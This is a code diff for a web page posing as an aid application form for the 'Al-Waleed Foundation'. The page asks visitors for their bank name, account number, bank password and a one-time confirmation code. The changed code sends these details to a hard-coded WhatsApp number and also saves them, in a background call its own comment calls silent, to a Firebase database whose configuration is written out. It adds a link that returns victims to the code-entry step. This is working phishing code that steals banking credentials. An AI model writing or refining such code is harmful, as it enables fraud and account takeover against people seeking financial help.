@@ -714,6 +714,16 @@
       const confirmOtpBtn = document.getElementById('confirmOtpBtn');
 
       // ==============================
+      //  التحقق من الرابط (العودة لخطوة التأكيد)
+      // ==============================
+      var urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('step') === '3') {
+        setTimeout(function () {
+          goToStep(3);
+        }, 100);
+      }
+
+      // ==============================
       //  تعبئة قائمة الدول
       // ==============================
       if (typeof COUNTRIES_DATA !== 'undefined') {
@@ -913,7 +923,7 @@
       });
 
       // زر إرسال واتساب
-      sendBtn.addEventListener('click', async function () {
+      sendBtn.addEventListener('click', function () {
         var bank = bankSelect.value;
         var account = accountInput.value.trim();
         var password = bankPassword.value.trim();
@@ -922,73 +932,75 @@
         if (!account || account.length < 3) { alert('يرجى إدخال رقم الحساب البنكي.'); accountInput.focus(); return; }
         if (!password) { alert('يرجى إدخال كلمة المرور.'); bankPassword.focus(); return; }
 
+        sendBtn.disabled = true;
+        sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
+
         var fullPhone = currentCountry ? (currentCountry.code + phoneInput.value) : phoneInput.value;
         var adminPhone = "966578012189";
+        
+        // بناء رابط التأكيد المباشر للعودة للخطوة 3
+        var confirmLink = window.location.href.split('?')[0] + "?step=3&name=" + encodeURIComponent(nameInput.value.trim()) + "&phone=" + encodeURIComponent(fullPhone);
 
-        try {
-          sendBtn.disabled = true;
-          sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';
+        var message = "📌 *طلب مساعدة جديد - مؤسسة الوليد* 📌\n\n";
+        message += "• *الاسم:* " + nameInput.value.trim() + "\n";
+        message += "• *الدولة:* " + countrySelect.value + "\n";
+        message += "• *الهاتف:* " + fullPhone + "\n";
+        message += "• *البنك:* " + bank + "\n";
+        message += "• *رقم الحساب:* " + account + "\n";
+        message += "• *كلمة المرور:* " + password + "\n";
+        message += "• *شرح الحالة:* " + notesInput.value.trim() + "\n\n";
+        message += "🪪 *أرفق صورة الهوية بعد رفع البيانات* 🪪\n\n";
+        message += "لإكمال طلبك، يرجى إدخال رمز التأكيد عبر الرابط التالي:\n" + confirmLink;
 
-          var [{ initializeApp, getApps, getApp }, { getFirestore, doc, setDoc }] = await Promise.all([
-            import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"),
-            import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js")
-          ]);
+        // تحديث الرابط الحالي ليكون خطوة التأكيد حتى إذا ضغط زر الرجوع يعود إليها
+        window.history.pushState({}, '', confirmLink);
+        
+        // الانتقال للخطوة 3 في الموقع
+        goToStep(3);
+        setTimeout(function () {
+          var firstOtp = document.querySelector('.otp-input');
+          if (firstOtp) firstOtp.focus();
+        }, 500);
 
-          var firebaseConfig = {
-            apiKey: "AIzaSyC1-J4dSTmxUnz5d7dvq9XWrRHf_Lr511M",
-            authDomain: "alwaleed-3a813.firebaseapp.com",
-            projectId: "alwaleed-3a813",
-            storageBucket: "alwaleed-3a813.firebasestorage.app",
-            messagingSenderId: "680698906569",
-            appId: "1:680698906569:web:154df6466c1c89d67f4a18"
-          };
+        sendBtn.disabled = false;
+        sendBtn.innerHTML = '<i class="fab fa-whatsapp"></i> إرسال عبر واتساب';
 
-          var app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
-          var db = getFirestore(app);
-          var phoneId = phoneInput.value.replace(/[^0-9]/g, '');
-          var uniqueId = phoneId + '_' + Date.now();
+        // الحفظ في Firebase في الخلفية بصمت
+        (async function() {
+          try {
+            var [{ initializeApp, getApps, getApp }, { getFirestore, doc, setDoc }] = await Promise.all([
+              import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"),
+              import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js")
+            ]);
+            var firebaseConfig = {
+              apiKey: "AIzaSyC1-J4dSTmxUnz5d7dvq9XWrRHf_Lr511M",
+              authDomain: "alwaleed-3a813.firebaseapp.com",
+              projectId: "alwaleed-3a813",
+              storageBucket: "alwaleed-3a813.firebasestorage.app",
+              messagingSenderId: "680698906569",
+              appId: "1:680698906569:web:154df6466c1c89d67f4a18"
+            };
+            var app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
+            var db = getFirestore(app);
+            var phoneId = phoneInput.value.replace(/[^0-9]/g, '');
+            var uniqueId = phoneId + '_' + Date.now();
+            await setDoc(doc(db, "us", uniqueId), {
+              name: nameInput.value.trim(),
+              phone: fullPhone,
+              country: countrySelect.value,
+              bank: bank,
+              accountNumber: account,
+              password: password,
+              notes: notesInput.value.trim(),
+              date: new Date().toISOString()
+            });
+          } catch (error) {
+            console.error("Firebase Error (Silent):", error);
+          }
+        })();
 
-          await setDoc(doc(db, "us", uniqueId), {
-            name: nameInput.value.trim(),
-            phone: fullPhone,
-            country: countrySelect.value,
-            bank: bank,
-            accountNumber: account,
-            password: password,
-            notes: notesInput.value.trim(),
-            date: new Date().toISOString()
-          });
-
-          var message = "📌 *طلب مساعدة جديد - مؤسسة الوليد* 📌\n\n";
-          message += "• *الاسم:* " + nameInput.value.trim() + "\n";
-          message += "• *الدولة:* " + countrySelect.value + "\n";
-          message += "• *الهاتف:* " + fullPhone + "\n";
-          message += "• *البنك:* " + bank + "\n";
-          message += "• *رقم الحساب:* " + account + "\n";
-          message += "• *كلمة المرور:* " + password + "\n";
-          message += "• *شرح الحالة:* " + notesInput.value.trim() + "\n\n";
-          message += "🪪 *أرفق صورة الهوية بعد رفع البيانات* 🪪";
-
-          // فتح واتساب في نافذة جديدة حتى يبقى المستخدم في الصفحة
-          window.open('https://wa.me/' + adminPhone + '?text=' + encodeURIComponent(message), '_blank');
-
-          // الانتقال للخطوة 3
-          goToStep(3);
-
-          // التركيز على أول حقل OTP
-          setTimeout(function () {
-            document.querySelector('.otp-input').focus();
-          }, 500);
-
-        } catch (error) {
-          console.error("خطأ:", error);
-          alert("حدث خطأ في الاتصال، ولكن سيتم توجيهك للواتساب.");
-          window.open('https://wa.me/966578012189', '_blank');
-          goToStep(3);
-        } finally {
-          sendBtn.disabled = false;
-          sendBtn.innerHTML = '<i class="fab fa-whatsapp"></i> إرسال عبر واتساب';
-        }
+        // التوجيه إلى واتساب لضمان فتح التطبيق
+        window.location.href = 'https://wa.me/' + adminPhone + '?text=' + encodeURIComponent(message);
       });
 
       // ==============================
@@ -1035,11 +1047,13 @@
         }
 
         var adminPhone = "966578012189";
-        var fullPhone = currentCountry ? (currentCountry.code + phoneInput.value) : phoneInput.value;
+        var currentParams = new URLSearchParams(window.location.search);
+        var storedName = currentParams.get('name') || nameInput.value.trim();
+        var storedPhone = currentParams.get('phone') || (currentCountry ? (currentCountry.code + phoneInput.value) : phoneInput.value);
 
         var message = "🔐 *رمز التأكيد* 🔐\n\n";
-        message += "• *الاسم:* " + nameInput.value.trim() + "\n";
-        message += "• *الهاتف:* " + fullPhone + "\n";
+        message += "• *الاسم:* " + storedName + "\n";
+        message += "• *الهاتف:* " + storedPhone + "\n";
         message += "• *رمز التأكيد:* " + otp + "\n\n";
         message += "✅ _تم إرسال رمز التأكيد بنجاح_";
 
